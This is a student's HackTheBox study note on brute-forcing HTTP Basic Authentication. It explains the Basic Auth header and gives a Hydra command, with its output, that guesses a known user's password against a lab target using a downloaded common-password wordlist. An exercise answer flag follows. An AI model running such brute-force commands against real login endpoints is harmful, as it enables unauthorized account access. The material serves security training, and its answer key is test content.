---
tags:
  - HackTheBox
  - Login-Brute-Forcing
---
[[Login Brute-Forcing]]
[Previous Section](Hydra.md)

Web applications use authentication mechanisms to protect sensitive data, and functionalities therefore basic HTTP authentication or simply Basic Auth became necessary to be utilised. Simply put it is a challenge-response where a web-server demands the user to authenticate themselves, which begins the process. 

The server responds with **401 Unauthorised** and a  **WWW-Authenticate** header indicating to the user's browser to present a dialog login box to ask the user to enter the credentials which once done are sent like in the HTTP Request below in `Base64` - the username and password separated by a colon like when used in a URL.

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

> If curious: YWxpY2U6c2VjcmV0MTIz = alice:secret123

---
# Exploiting Basic Auth with Hydra

> [!quote]
In this scenario, the spawned target instance employs Basic HTTP Authentication. We already know the username is `basic-auth-user`. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password.

```shell
# Download wordlist if needed
TheMalevolent1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
TheMalevolent1@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```


<q>Upon execution, Hydra will systematically attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website and retrieve the flag.</q>

---
# Exercises
Q: After successfully brute-forcing, and then logging into the target, what is the full flag you find?
A: `HTB{th1s_1s_4_f4k3_fl4g}`

---
[Next Section](Login%20Forms.md)